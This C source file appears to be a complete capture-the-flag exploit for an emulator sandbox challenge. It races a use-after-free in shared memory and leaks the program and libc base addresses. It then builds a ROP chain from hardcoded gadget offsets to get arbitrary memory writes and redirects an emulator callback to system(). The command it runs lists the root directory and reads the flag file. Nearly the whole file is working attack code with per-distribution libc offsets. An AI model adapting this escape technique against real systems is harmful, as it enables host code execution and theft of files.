#include <stdio.h>

static __attribute__((always_inline)) unsigned long syscall3(unsigned long n, unsigned long a1, unsigned long a2,
                                                             unsigned long a3) {
    register unsigned long rax __asm__ ("rax") = n;
    register unsigned long rbx __asm__ ("rbx") = a1;
    register unsigned long rcx __asm__ ("rcx") = a2;
    register unsigned long rdx __asm__ ("rdx") = a3;
    unsigned long ret;
    __asm__ __volatile__ (
        "int $0x80;"
        : "+r" (rax)
        : "r" (rax), "r"(rbx), "r" (rcx), "r" (rdx)
        : "r11", "memory"
    );
    ret = rax;
    return ret;
}

#include "shared.h"


void _start() {
    unsigned long res;
    // race
    while (1) {
        sys_resume(0);
        res = sys_map_shared(UAF_VA, UAF_SZ, 0);
        if (res != 0) {
            continue;
        }

        u_puts("pid1: mmaped chunk successfully");
        if (UAF_CHUNK->data[0] == 0) {
            u_puts("pid1: not uaf chunk, retrying");
            sys_unmap_shared();
            continue;
        }
        u_printf("pid1: found non zero value %x\n", UAF_CHUNK->data[0]);
        UAF_CHUNK->data[4] = UAF_MARKER_VAL;
        u_puts("pid1: wrote marker to chunk");
        break;
    }
    sys_resume(0);

    sys_pause();
    u_puts("pid1: resumed from arm32 stage, inspecting uaf chunk");


    // for (int i = 0; i < 0x4000 / 8; ++i) {
    //     u_printf("pid1: f0 %x\n", UAF_CHUNK->data[i]);
    // }
    unsigned long uc_addr = UAF_CHUNK->data[0x40 / 8]; // print &((struct uc_struct *)0).address_space_memory.uc
    unsigned long arm_release = UAF_CHUNK->data[o_uc_struct__release / 8];
    unsigned long base = arm_release - sym_arm_release;
    u_printf("pid1: base %x\n", base);
    u_printf("pid1: uc   %x\n", uc_addr);

    // rdi = 0x10 + uc_addr
    UAF_CHUNK->data[o_uc_struct__read_mem / 8] = base + 0xb9dd45;
    //  #: push rdi ; pop rsp ; test al, 0xFF ; add rsp, 0x28 ; ret ; (1 found)
    // rsp = 0x38 + uc_addr

    int irop;
    irop = 0x38 / 8;
    unsigned long o_new_rsp = 0x64d0;

    UAF_CHUNK->data[irop++] = base + 0x16d298; // pop rsp; ret;
    UAF_CHUNK->data[irop++] = uc_addr + o_new_rsp;

    // 0x00e0508b: mov [rdi], rdx; ret;
    // 0x0097d172: pop rdx; ret;
    // 0x00e478fd: pop rdi; ret;

    unsigned long fake_shared_buffer = base + 0x127fe60 + 24 * 3; // handle = 3
    // struct shared_buffer {
    //     volatile atomic_uint refs;
    //     void* buffer;
    //     unsigned length;
    // };

    irop = o_new_rsp / 8;



    unsigned fake_buffer_size = 0x10000000;
                              // 0x2da76b0

    // www
    UAF_CHUNK->data[irop++] = base + 0x00e478fd ; // : pop rdi; ret;
    UAF_CHUNK->data[irop++] = fake_shared_buffer + 8 ; // rdi // where
    UAF_CHUNK->data[irop++] = base + 0x0097d172 ; // : pop rdx; ret; ;
    UAF_CHUNK->data[irop++] = base ; // rdx // what - buffer
    UAF_CHUNK->data[irop++] = base + 0x00e0508b; ///: mov [rdi], rdx; ret;

    // www
    UAF_CHUNK->data[irop++] = base + 0x00e478fd ; // : pop rdi; ret;
    UAF_CHUNK->data[irop++] = fake_shared_buffer + 0x10 ; // rdi // where
    UAF_CHUNK->data[irop++] = base + 0x0097d172 ; // : pop rdx; ret; ;
    UAF_CHUNK->data[irop++] = fake_buffer_size ; // rdx // what - length
    UAF_CHUNK->data[irop++] = base + 0x00e0508b; ///: mov [rdi], rdx; ret;

    // www
    UAF_CHUNK->data[irop++] = base + 0x00e478fd ; // : pop rdi; ret;
    UAF_CHUNK->data[irop++] = fake_shared_buffer + 0 ; // rdi // where
    UAF_CHUNK->data[irop++] = base + 0x0097d172 ; // : pop rdx; ret; ;
    UAF_CHUNK->data[irop++] = 0xff ; // rdx // what - refs
    UAF_CHUNK->data[irop++] = base + 0x00e0508b; ///: mov [rdi], rdx; ret;


    UAF_CHUNK->data[irop++] = base + 0x0097d172 ; // : pop rdx; ret; ;
    UAF_CHUNK->data[irop++] = base + 0x00e4e805 ; // 0x00e4e805: jmp rdx;
    UAF_CHUNK->data[irop++] = base + 0x00e4e805 ; // 0x00e4e805: jmp rdx;


    UAF_CHUNK->data[irop++] = 0xdead; // should not reach here


    sys_resume(0);


    sys_unmap_shared();

    while (1) {
        unsigned long www_res = sys_map_shared((void *)base, fake_buffer_size, 3);
        if (www_res == 0) {
            u_printf("pid 1: mmaped %x\n", base);
            break;
        }
    }


    unsigned long o_free_plt = 0x120c140;
    unsigned long o_processes = 0x127fe00;
    unsigned long o_proc1_ptr = o_processes + 8;



    unsigned long free = *(unsigned long *)(base + o_free_plt);
    u_printf("pid1: free %x\n", free);


    unsigned long libc_base;
    unsigned long system;
    int o_free;
    int o_system;

    if ((free & 0xfff )== 0x3e0) {
        // Ubuntu 22.04.4 LTS
        o_free = 0x00000000000a53e0;
        o_system = 0x0000000000050d70;
    } else {
        // 24.04 dev
        o_free = 0xadd20;
        o_system = 0x58740;
    }
    libc_base = free - o_free;
    system = libc_base + o_system;



    u_printf("pid1: libc %x\n", libc_base);
    unsigned long proc1 = *(unsigned long *)(base + o_proc1_ptr);
    u_printf("pid1: proc1 %x\n", proc1);

    unsigned long uc = *(unsigned long *)(proc1 + 0x10);

    u_printf("pid1: x86 uc %x\n", uc);

    strcpy((char *)(uc + 0x10), "pwd;ls /;cat /fl*;");
    *(unsigned long *)(uc + o_uc_struct__read_mem) = system;


    u_puts("pid1: trigger");

    while (1) {
    }
}
